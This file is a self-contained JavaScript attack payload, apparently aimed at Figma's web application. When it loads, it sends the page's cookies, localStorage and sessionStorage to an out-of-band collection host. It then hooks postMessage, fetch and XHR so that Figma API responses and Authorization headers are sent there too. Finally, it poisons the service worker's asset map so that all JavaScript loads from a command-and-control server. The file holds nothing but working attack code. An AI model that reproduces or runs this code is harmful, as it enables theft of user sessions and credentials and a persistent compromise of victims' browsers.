  (function () {
    const C2 = 'https://gleeful-creponne-8ff162.netlify.app';
    const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';

    function exfil(tag, data) {
      navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
    }

    // === STEP 1 CONFIRM: this fires on load ===
    exfil('loaded', {
      origin: location.origin,
      href: location.href,
      cookie: document.cookie,
      ls: JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage.getItem(k)]))),
      ss: JSON.stringify(Object.fromEntries(Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])))
    });

    // === postMessage sniffer ===
    window.addEventListener('message', e => {
      exfil('pm', { from: e.origin, data: typeof e.data === 'string' ? e.data : JSON.stringify(e.data) });
    }, true);

    // === Fetch hook — captures api.figma.com responses ===
    const _fetch = window.fetch.bind(window);
    window.fetch = async function(input, init) {
      const response = await _fetch(input, init);
      const url = typeof input === 'string' ? input : input.url;
      if (url.includes('api.figma.com') || url.includes('figma.com/api')) {
        try {
          const clone = response.clone();
          const body = await clone.text();
          const reqAuth = (init && init.headers)
            ? (init.headers['Authorization'] || init.headers['authorization'] || '')
            : '';
          exfil('api', { url, method: (init && init.method) || 'GET', auth: reqAuth, status: response.status, body:
  body.slice(0, 4000) });
        } catch(e) {}
      }
      return response;
    };

    // === XHR hook ===
    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
      this._url = url; this._method = method;
      return _open.apply(this, [method, url, ...args]);
    };
    XMLHttpRequest.prototype.send = function(body) {
      this.addEventListener('load', function() {
        if (this._url && (this._url.includes('api.figma.com') || this._url.includes('figma.com/api'))) {
          exfil('xhr', { url: this._url, method: this._method, status: this.status, body: this.responseText.slice(0,4000) });
        }
      });
      return _send.apply(this, arguments);
    };

    // === Re-poison SW on next update-asset-url-map ===
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      const ctrl = navigator.serviceWorker.controller;
      const orig = ctrl.postMessage.bind(ctrl);
      ctrl.postMessage = function(msg) {
        if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
          const poisoned = { ...msg.assets };
          for (const k of Object.keys(poisoned)) {
            if (k.endsWith('.js')) poisoned[k] = C2 + '/payload.js';
          }
          return orig({ ...msg, assets: poisoned });
        }
        return orig(msg);
      };
      exfil('sw_hooked', { scope: navigator.serviceWorker.controller.scriptURL });
    }

  })();
